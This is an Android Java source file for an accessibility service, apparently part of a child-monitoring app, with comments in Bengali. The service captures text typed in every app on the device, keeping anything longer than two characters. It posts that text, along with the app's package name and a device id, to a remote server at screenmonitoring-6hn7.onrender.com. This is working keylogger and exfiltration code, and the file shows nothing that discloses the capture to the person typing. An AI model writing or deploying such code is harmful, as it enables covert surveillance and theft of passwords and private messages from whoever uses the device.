package com.monitoring.child;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.util.Log;

import org.json.JSONObject;

import java.util.List;
import okhttp3.MediaType;
import okhttp3.Request;
import okhttp3.RequestBody;

public class MyTextCaptureService extends AccessibilityService {

    private static final String TAG = "TextCaptureService";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            List<CharSequence> texts = event.getText();
            if (texts != null && !texts.isEmpty()) {
                String typedText = texts.get(0).toString().trim();

                if (typedText.length() > 2) {  // খুব ছোট টেক্সট বাদ দিতে
                    String packageName = event.getPackageName() != null
                            ? event.getPackageName().toString()
                            : "unknown";

                    Log.d(TAG, "Typed: " + typedText + " | App: " + packageName);

                    sendToBackend(typedText, packageName);
                }
            }
        }
    }

    private void sendToBackend(String text, String packageName) {
        new Thread(() -> {
            try {
                String url = UrlHelper.getApiUrl("screenmonitoring-6hn7.onrender.com", "/api/typed-text");

                JSONObject json = new JSONObject();
                json.put("device_id", getStoredDeviceId());  // নিচে দেখুন
                json.put("text", text);
                json.put("app_package", packageName);
                json.put("timestamp", System.currentTimeMillis());

                RequestBody body = RequestBody.create(
                        json.toString(),
                        MediaType.parse("application/json; charset=utf-8")
                );

                Request request = new Request.Builder()
                        .url(url)
                        .post(body)
                        .build();

                // আপনার httpClient ব্যবহার করতে চাইলে static করে নিন অথবা নতুন OkHttpClient ব্যবহার করুন
                new okhttp3.OkHttpClient().newCall(request).enqueue(new okhttp3.Callback() {
                    @Override
                    public void onFailure(okhttp3.Call call, java.io.IOException e) {
                        Log.e(TAG, "Failed to send text", e);
                    }
                    @Override
                    public void onResponse(okhttp3.Call call, okhttp3.Response response) {
                        response.close();
                    }
                });
            } catch (Exception e) {
                Log.e(TAG, "Error sending to backend", e);
            }
        }).start();
    }

    private String getStoredDeviceId() {
        android.content.SharedPreferences prefs = getSharedPreferences("monitoring_prefs", MODE_PRIVATE);
        return prefs.getString("device_id", "UNKNOWN");
    }

    @Override
    public void onInterrupt() {}

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Text Capture Accessibility Service Connected");
    }
}